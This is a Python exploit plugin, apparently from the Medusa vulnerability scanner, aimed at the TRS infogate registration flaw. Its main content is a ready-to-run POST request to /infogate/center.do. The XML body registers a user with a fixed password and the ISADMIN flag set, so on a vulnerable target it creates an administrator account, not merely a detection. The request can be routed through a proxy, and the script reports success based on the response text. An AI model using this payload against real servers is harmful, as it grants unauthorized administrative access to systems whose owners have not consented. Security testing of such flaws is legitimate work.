#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: trs infogate插件 任意注册漏洞
referer: unknown
author: Ascotbe
reference: Lucifer
description: infogate在注册的时候允许带入多个不在计划内的参数能够注册并开通管理账户。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/infogate/center.do"

post_data = '''
    <post-data><method type="save">infogate_customer</method><parameters><CUSTOMERUSERID><![CDATA[0]]></CUSTOMERUSERID><USERSTATUS><![CDATA[1]]></USERSTATUS><USERNAME><![CDATA[testabd]]></USERNAME><EMAIL><![CDATA[1@1.1.1.1]]></EMAIL><PASSWORD><![CDATA[111111]]></PASSWORD><REALNAME><![CDATA[]]></REALNAME><NICKNAME><![CDATA[]]></NICKNAME><COMEFROM><![CDATA[]]></COMEFROM><TELEPHONE><![CDATA[]]></TELEPHONE><ISADMIN><![CDATA[1]]></ISADMIN><GROUPID><![CDATA[0]]></GROUPID></parameters></post-data>
'''
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('customeruserid')!=-1 and con.lower().find('customeruser')!=-1:
            Medusa = "{} 存在XXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass